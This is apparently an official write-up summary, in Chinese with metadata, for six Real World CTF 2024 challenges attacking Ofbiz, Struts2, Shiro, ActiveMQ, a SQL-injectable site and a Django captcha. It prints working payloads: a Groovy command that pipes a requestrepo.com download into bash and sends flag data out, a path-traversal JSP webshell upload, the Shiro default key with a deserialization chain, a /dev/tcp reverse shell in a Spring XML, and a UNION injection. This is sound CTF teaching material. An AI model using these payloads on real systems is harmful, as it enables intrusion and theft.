---
title: 【Real World CTF 6th Writeup】RWCTF 2024 体验赛官方 Writeup
contest: RealWorldCTF
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [Ofbiz-ProgramExport, Struts2-upload, path-traversal, Old-Shiro-AES-CBC, CommonsBeanutils, CB-gadget, ActiveMQ-ClassPathXml, Spring-XML-RCE, captcha-seed-predict, Django-CSRF]
attack_chain: 1. Ofbiz POST /webtools/control/ProgramExport groovyProgram=["sh","-c","curl requestrepo | bash"].execute()/2. Struts2 upload.action filename ../../../views/a.jsp JSP 一句话木马/3. Old-Shiro AES/CBC/PKCS5Padding 已知密钥 kPH+bIxk5D2deZiIxcaaaA== + CommonsBeanutils 反序列化 + RequestContextHolder 反射 RCE/4. ActiveMQ 61616 端口写 org.springframework.context.support.ClassPathXmlApplicationContext 远程 XML RCE/5. SQL 注入 /tags.php?/alias/aaaaaaa%27||+1=N+union+select+1,flag_value,3,4,5,6,7,8,0,10,11+from+flag/6. captcha seed 预测 random.seed(seed) + Django CSRF token 利用
key_payload: Ofbiz groovyProgram  Struts2 filename=../../../views/a.jsp  Shiro key=kPH+bIxk5D2deZiIxcaaaA==  ActiveMQ ClassPathXmlApplicationContext
one_liner: Real World CTF 6th 2024 体验赛 6 道题官方 WP，覆盖 Ofbiz Groovy RCE/Struts2 上传/Shiro AES 反序列化/ActiveMQ Spring XML RCE/SQL 注入/Captcha 预测。
lesson: Ofbiz ProgramExport groovy 沙箱 RCE 经典路径；Struts2 filename 跨目录上传写 JSP；Shiro 已知密钥 + CommonsBeanutils 反序列化是 Java 经典 RCE；ActiveMQ OpenWire 协议可发送 ClassPathXmlApplicationContext 触发 Spring XML RCE。
quality: high
---

# 【Real World CTF 6th Writeup】RWCTF 2024 体验赛官方 Writeup

## 概览
Real World CTF 6th 2024 体验赛 6 道题官方 WP，覆盖主流 Java 框架漏洞。

## 1. Be-a-Framework-Hacker (Ofbiz)
```bash
docker build . -t rwctf:be-a-framework-hacker
docker run --rm -p 8443:8443 rwctf:be-a-framework-hacker
```
- POST `/webtools/control/ProgramExport;/?USERNAME=&PASSWORD=&requirePasswordChange=Y`
- Content-Type: `application/x-www-form-urlencoded`
- Body: `groovyProgram=["sh","-c","curl http://igr3yxom.requestrepo.com | bash"].execute()`
- 反弹 flag: `curl http://requestrepo.com/igr3yxom/ --data $(/readflag)`

## 2. Be-more-Elegant (Struts2)
- POST `/upload.action;jsessionid=D2DF7842CD2DEA1BE82A7300A134F655`
- Multipart: filename=../../../views/a.jsp（路径穿越）
- JSP 内容执行 Runtime.exec 反弹

## 3. Old-Shiro (Shiro AES-CBC)
- 默认密钥 `kPH+bIxk5D2deZiIxcaaaA==`
- AES/CBC/PKCS5Padding 加密反序列化 payload
- CommonsBeanutils + Permit-reflect + TemplatesImpl 链
- Payload 触发后通过 RequestContextHolder 反射加响应头
- Cookie: `rememberMe_rwctf_2024=<long-base64-cipher>`

## 4. Be-an-ActiveMq-Hacker (ActiveMQ 61616)
- 写 `org.springframework.context.support.ClassPathXmlApplicationContext` 类名
- Java OpenWire 协议序列化
- 远程加载 evil.xml 触发 Spring RCE
- evil.xml 构造 `<constructor-arg><list><value>/bin/bash</value><value>-c</value><value>/bin/bash -i >& /dev/tcp/localhost/9999 0>&1</value></list></constructor-arg>`

## 5. YourSqlTrick (SQL 注入)
- `/tags.php?/alias/aaaaaaa%27||+1=N+union+select+1,flag_value,3,4,5,6,7,8,0,10,11+from+flag+where+1=%271`
- URL 编码单引号 + `||` 字符串拼接 + UNION 注入

## 6. Be-a-Captcha-Guesser (Django + Captcha 预测)
- captcha 图像生成基于 `random.seed(seed)`
- 已知 seed 后可预测 `random_string(6, lower=False, upper=False)`
- 流程：fix_seed 触发 + nop_random + send_code 触发 + do_setup_password + code 爆破
- 工具：requests_html + urllib3 + proxies

## 经验提炼
- Ofbiz ProgramExport groovy 沙箱 RCE 经典路径
- Struts2 filename 跨目录上传写 JSP
- Shiro 已知密钥 + CommonsBeanutils 反序列化是 Java 经典 RCE
- ActiveMQ OpenWire 协议可发送 ClassPathXmlApplicationContext 触发 Spring XML RCE
- URL 编码单引号 + `||` 字符串拼接绕 SQL 过滤
- Django captcha 基于 random.seed 预测是密码学弱点
- Java 反序列化三件套：Permit-reflect + CommonsBeanutils + TemplatesImpl
